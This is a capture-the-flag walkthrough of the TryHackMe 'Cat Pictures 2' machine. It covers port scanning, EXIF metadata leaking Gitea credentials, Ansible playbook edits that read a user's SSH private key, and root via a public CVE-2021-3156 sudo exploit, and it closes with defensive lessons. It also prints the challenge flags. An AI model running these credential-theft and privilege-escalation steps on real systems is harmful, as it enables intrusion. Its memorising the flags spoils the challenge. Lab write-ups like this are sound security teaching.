# TryHackMe - Cat Pictures 2 Writeup

<p align="center">

<img src="https://img.shields.io/badge/TryHackMe-Cat%20Pictures%202-red?style=for-the-badge">
<img src="https://img.shields.io/badge/Difficulty-Easy-success?style=for-the-badge">
<img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge">
<img src="https://img.shields.io/badge/Category-Boot2Root-orange?style=for-the-badge">

</p>

---

# Overview

**Cat Pictures 2** is an Easy Linux machine from TryHackMe focused on web enumeration, source code analysis, information disclosure, Ansible abuse, SSH key extraction, and local privilege escalation through a known sudo vulnerability.

Unlike traditional beginner machines where a single vulnerable web application leads directly to a shell, this machine requires enumerating several exposed services, correlating information between them, abusing an exposed automation platform, and finally escalating privileges using a publicly known CVE.

The compromise path follows this progression:

```
Enumeration
      │
      ▼
Image Metadata Disclosure
      │
      ▼
Gitea Credentials
      │
      ▼
Source Code Review
      │
      ▼
OliveTin / Ansible Abuse
      │
      ▼
SSH Private Key Disclosure
      │
      ▼
SSH Access as bismuth
      │
      ▼
CVE-2021-3156
      │
      ▼
Root
```

---

# Machine Information

| Name | Cat Pictures 2 |
|------|----------------|
| Platform | TryHackMe |
| Difficulty | Easy |
| Operating System | Linux |
| Objective | Capture all three flags and obtain root access |

---

# Target

```
10.48.154.149
```

---

# Initial Enumeration

As always, the very first step is identifying every accessible service running on the target.

A full TCP port scan is performed to avoid missing hidden services.

```bash
nmap -p- 10.48.154.149
```

Result:

```text
22/tcp    open  ssh
80/tcp    open  http
222/tcp   open  ssh
1337/tcp  open  http
3000/tcp  open  http
8080/tcp  open  http
```

Unlike many Easy machines exposing only SSH and HTTP, this target presents **multiple web services and two SSH instances**, suggesting that the attack surface is distributed across different applications.

To obtain service versions and additional information, a second scan is performed.

```bash
nmap -sC -sV 10.48.154.149
```

---

# Service Enumeration

| Port | Service | Version |
|-------|----------|----------|
|22|SSH|OpenSSH 7.6p1 Ubuntu|
|80|HTTP|Nginx 1.4.6|
|222|SSH|OpenSSH 9.0|
|1337|HTTP|OliveTin|
|3000|HTTP|Gitea|
|8080|HTTP|Python SimpleHTTPServer|

Immediately several interesting observations can be made.

- Two SSH services are available.
- Multiple web applications are exposed.
- Port **1337** hosts **OliveTin**, an automation dashboard.
- Port **3000** hosts **Gitea**, a Git repository service.
- Port **80** hosts **Lychee**, an open-source photo management application.
- Port **8080** hosts a Python web server.

These services are likely related and should be investigated individually.

---

# Enumerating Port 80

Browsing to the main website reveals a **Lychee photo gallery**.

<p align="center">

*Screenshot: Lychee Homepage*

</p>

Version identification shows:

```
Lychee 3.1.1
```

served by

```
nginx 1.4.6
```

---

## robots.txt

The next step is checking the robots file.

```
http://10.48.154.149/robots.txt
```

Contents:

```text
User-agent: *

Disallow: /data/
Disallow: /dist/
Disallow: /docs/
Disallow: /php/
Disallow: /plugins/
Disallow: /src/
Disallow: /uploads/
```

Most directories return **403 Forbidden**, meaning they exist but directory listing is disabled.

Although these entries are interesting, they do not immediately provide a path toward exploitation.

---

# Git Repository Exposure

During Nmap service enumeration another interesting finding appears.

```
http-git

/.git/
```

The scan reports an exposed Git repository.

```
Repository found

Remote:

https://github.com/electerious/Lychee.git
```

This indicates that the application is using the publicly available Lychee source code.

While an exposed Git repository can often leak credentials or application secrets, no immediately useful information is recovered during this assessment.

---

# Directory Enumeration

To discover hidden resources, directory brute forcing is performed.

```bash
gobuster dir \
-u http://10.48.154.149 \
-w /usr/share/wordlists/dirb/big.txt
```

No interesting directories are recovered beyond the expected application structure.

Since enumeration on port 80 reaches a dead end, attention shifts toward the remaining exposed services.

---

# Enumerating Port 1337

Visiting port **1337** reveals a web interface for **OliveTin**.

OliveTin is an automation platform capable of executing predefined commands and tasks.

Since such applications frequently execute commands on the host operating system, they become highly attractive targets during penetration testing.

Directory enumeration is performed.

```bash
gobuster dir \
-u http://10.48.154.149:1337 \
-w /usr/share/wordlists/dirb/big.txt
```

Output:

```text
/api
/js
/themes
```

The discovery of an exposed **API endpoint** suggests that the application likely communicates through REST requests.

Although no immediate vulnerability is identified, OliveTin becomes an important target because later enumeration reveals that it executes Ansible playbooks.

---

# Enumerating Port 3000

Port **3000** hosts another application.

Opening it in the browser reveals:

```
Gitea
Git with a cup of tea
```

Gitea is a lightweight Git hosting platform similar to GitHub.

Without valid credentials there is little that can be accessed initially.

At this stage no obvious login bypass or public repository provides useful information.

The machine therefore appears to require discovering credentials elsewhere.

---

# Enumerating Port 8080

Port **8080** hosts a Python SimpleHTTPServer.

Initially it appears uninteresting.

No sensitive directories or endpoints are immediately exposed.

However, this service later becomes important after hidden information is recovered from image metadata.

---

# Image Analysis

Returning to the Lychee gallery, every available image is downloaded for offline analysis.

Whenever applications revolve around images, metadata should always be inspected because developers often forget to remove embedded comments or titles.

One downloaded image is analyzed using ExifTool.

```bash
exiftool image.jpg -v
```

The metadata immediately reveals something extremely valuable.

The image title contains a reference to another service.

```
Title

:8080/764efa883dda1e11db47671c4a3bbd9e.txt
```

This hidden path was not visible through normal browsing and strongly suggests that developers stored sensitive information inside image metadata.

Navigating to the referenced text file reveals the first set of credentials.

```text
gitea

user: samarium

password:
TUmhyZ37CLZrhP
```

This completely changes the attack path.

Instead of attempting to exploit Lychee directly, legitimate credentials can now be used to authenticate to the Gitea instance hosted on port **3000**.

---

# Accessing Gitea

Using the recovered credentials:

```
Username:
samarium

Password:
TUmhyZ37CLZrhP
```

Login succeeds successfully.

After authentication several repositories become visible.

One repository immediately attracts attention.

```
ansible
```

Since OliveTin is designed to execute automated tasks and frequently integrates with Ansible, this repository is likely involved in server automation.

Reviewing the repository contents reveals several important files including:

```
flag1.txt

playbook.yaml
```

Opening **flag1.txt** provides the first user flag.

```
THM{********************************}
```

✅ **Flag 1 Captured**

---

At this point the initial foothold has been established.

The remaining objective is understanding how the exposed **Ansible playbook** can be abused to execute arbitrary commands on the target system and obtain further access.

# Exploiting the Ansible Repository

After obtaining access to the **samarium** account on Gitea, the next step is reviewing the repository contents in detail.

The repository contains an Ansible playbook responsible for executing automated tasks on the target machine.

One file immediately stands out:

```
playbook.yaml
```

Opening the playbook reveals the automation configuration.

```
remote_user: bismuth
```

This line is extremely important because it identifies another system user.

```
bismuth
```

Instead of attacking blindly, we now know the automation framework executes tasks as **bismuth**, making this account the next target.

---

# Understanding the Playbook

The playbook consists of Ansible tasks executed by OliveTin.

Since the repository is writable, any task added to the playbook will eventually be executed automatically.

This effectively provides **authenticated remote command execution** through Ansible.

Instead of spawning a reverse shell immediately, a safer approach is first confirming command execution.

The following task is added.

```yaml
command: cat flag2.txt
register: username_on_the_host
changed_when: false
```

Once the playbook executes, the output returns the contents of **flag2.txt**, confirming that arbitrary commands are successfully executed on the remote host.

This proves that:

- We control Ansible execution.
- Commands execute as **bismuth**.
- Arbitrary files belonging to bismuth can be accessed.

---

# Extracting the SSH Private Key

Rather than relying on unstable reverse shells, SSH access provides a much cleaner foothold.

The next task simply reads the user's private SSH key.

```yaml
command: cat /home/bismuth/.ssh/id_rsa
register: username_on_the_host
changed_when: false
```

After the playbook executes, the entire private key is returned.

This allows direct SSH authentication without requiring the user's password.

The returned key is copied into a local file.

```bash
nano id_rsa
```

Paste the private key exactly as received.

Then secure its permissions.

```bash
chmod 600 id_rsa
```

---

# SSH Login

Using the recovered key, authentication succeeds immediately.

```bash
ssh -i id_rsa bismuth@10.48.154.149
```

Successful login:

```text
bismuth@catpictures-ii:~$
```

The compromise has now moved from web application access to an interactive Linux shell.

---

# Capturing Flag 2

Listing the user's home directory reveals the second flag.

```bash
ls
```

Output:

```text
flag2.txt
```

Reading the file:

```bash
cat flag2.txt
```

Output:

```text
5e2cafbbf180351702651c09cd797920
```

✅ **Flag 2 Captured**

---

# Post Exploitation Enumeration

With shell access established, the next objective is privilege escalation.

System information is collected first.

```bash
uname -a
```

Output

```text
Linux catpictures-ii 4.15.0-206-generic
Ubuntu
x86_64
```

Checking the installed sudo version:

```bash
sudo -V
```

Output:

```text
Sudo version 1.8.21p2
```

Knowing exact software versions is extremely valuable because privilege escalation opportunities often depend entirely on version numbers.

Version **1.8.21p2** immediately suggests checking for publicly available vulnerabilities.

---

# Vulnerability Research

Searching for known vulnerabilities affecting this sudo release identifies one of the most famous Linux privilege escalation bugs.

## CVE-2021-3156

Also known as

```
Baron Samedit
```

Affected versions of sudo allow local users to escalate privileges to **root** through a heap-based buffer overflow.

Because the installed version falls within the vulnerable range, this becomes the most reliable privilege escalation path.

The public exploit used during this machine is available here:

```
https://github.com/CptGibbon/CVE-2021-3156
```

The exploit source is transferred to the target machine.

Repository contents:

```text
exploit.c
shellcode.c
Makefile
```

Compilation is straightforward.

```bash
make
```

Compilation output:

```text
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
```

No compilation errors occur, confirming that all required dependencies are already installed.

The environment is now ready for privilege escalation.

---

At this point everything required for obtaining full root access is prepared. The final step is executing the compiled exploit, spawning a root shell, capturing the last flag, and completing the machine.

# Privilege Escalation

After successfully obtaining an SSH shell as **bismuth**, the final objective is escalating privileges to **root**.

Before attempting any privilege escalation technique, basic host enumeration is performed.

---

## System Information

Checking the kernel version:

```bash
uname -a
```

Output:

```text
Linux catpictures-ii 4.15.0-206-generic #217-Ubuntu SMP Fri Feb 3 19:10:13 UTC 2023 x86_64 GNU/Linux
```

Next, determine the installed sudo version.

```bash
sudo -V
```

Output:

```text
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
```

The installed version immediately stands out because it is known to be vulnerable to a well-known local privilege escalation vulnerability.

---

# CVE-2021-3156 (Baron Samedit)

Searching for publicly disclosed vulnerabilities affecting **sudo 1.8.21p2** leads to **CVE-2021-3156**, commonly known as **Baron Samedit**.

This vulnerability is a heap-based buffer overflow affecting numerous sudo versions.

An authenticated local user can exploit the flaw to obtain **root privileges** without requiring sudo permissions.

Since the target machine is running a vulnerable version, this becomes the most reliable privilege escalation method.

Public exploit used:

```
https://github.com/CptGibbon/CVE-2021-3156
```

---

# Preparing the Exploit

The exploit repository is cloned or transferred onto the target machine.

Repository contents:

```text
exploit.c
shellcode.c
Makefile
```

Compile the exploit.

```bash
make
```

Compilation output:

```text
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
```

Compilation completes successfully without any errors.

---

# Exploiting the Vulnerability

Run the compiled exploit.

```bash
./exploit
```

Within a few seconds a root shell is spawned.

```text
#
```

Verification:

```bash
whoami
```

Output:

```text
root
```

The privilege escalation is successful.

---

# Capturing the Final Flag

Navigate to the root directory.

```bash
cd /root
```

Display the contents.

```bash
ls
```

Output:

```text
flag3.txt
```

Read the flag.

```bash
cat flag3.txt
```

Output:

```text
6d2a9f8f8174e86e27d565087a28a971
```

✅ **Flag 3 Captured**

---

# Attack Summary

The complete attack chain is summarized below.

```text
Nmap Enumeration
        │
        ▼
Multiple HTTP Services Discovered
        │
        ▼
Lychee Image Metadata Analysis
        │
        ▼
Hidden Text File on Port 8080
        │
        ▼
Recovered Gitea Credentials
        │
        ▼
Logged into Gitea
        │
        ▼
Discovered Ansible Repository
        │
        ▼
Modified playbook.yaml
        │
        ▼
Arbitrary Command Execution
        │
        ▼
Extracted /home/bismuth/.ssh/id_rsa
        │
        ▼
SSH Login as bismuth
        │
        ▼
Local Enumeration
        │
        ▼
Identified Vulnerable sudo Version
        │
        ▼
Exploited CVE-2021-3156
        │
        ▼
Root Shell
        │
        ▼
Captured flag3.txt
```

---

# Flags

| Flag | Value |
|-------|-------|
| Flag 1 | Retrieved from the Gitea repository (`flag1.txt`) |
| Flag 2 | `5e2cafbbf180351702651c09cd797920` |
| Flag 3 | `6d2a9f8f8174e86e27d565087a28a971` |

---

# MITRE ATT&CK Mapping

| Tactic | Technique |
|----------|-----------|
| Reconnaissance | Active Scanning (T1595) |
| Discovery | Network Service Discovery (T1046) |
| Discovery | File and Directory Discovery (T1083) |
| Credential Access | Unsecured Credentials (T1552) |
| Initial Access | Valid Accounts (T1078) |
| Execution | Command and Scripting Interpreter (T1059) |
| Persistence | SSH Authorized Keys (T1098) |
| Privilege Escalation | Exploitation for Privilege Escalation (T1068) |
| Credential Access | Private Keys (T1552.004) |

---

# Lessons Learned

- Never store sensitive credentials inside image metadata.
- Git repositories should never expose operational secrets.
- Automation platforms such as Ansible and OliveTin should be strictly access-controlled.
- Private SSH keys must never be retrievable through automation workflows.
- Regular patch management is essential to prevent exploitation of publicly known vulnerabilities like **CVE-2021-3156**.
- Publicly disclosed exploits remain effective against systems that are not updated.

---

# Conclusion

Cat Pictures 2 is an excellent beginner-friendly Linux machine that combines several realistic attack techniques into a single exploitation chain. Instead of relying on a single vulnerable service, it encourages careful enumeration across multiple exposed applications, rewarding attention to detail through metadata analysis, source code review, and automation abuse.

The path from image metadata to Gitea credentials, followed by Ansible playbook manipulation and SSH key extraction, demonstrates how seemingly minor information disclosures can quickly escalate into full system compromise. The final privilege escalation using **CVE-2021-3156 (Baron Samedit)** reinforces the importance of timely patch management and maintaining up-to-date software versions.

Overall, the machine provides valuable hands-on experience in web enumeration, credential discovery, authenticated exploitation, SSH key abuse, and Linux privilege escalation, making it an excellent exercise for beginners transitioning into intermediate penetration testing methodologies.

---

**Machine Status:** ✅ Rooted  
**Difficulty:** Easy  
**Operating System:** Linux  
**Platform:** TryHackMe
**Jai Shri Ram - Naval**
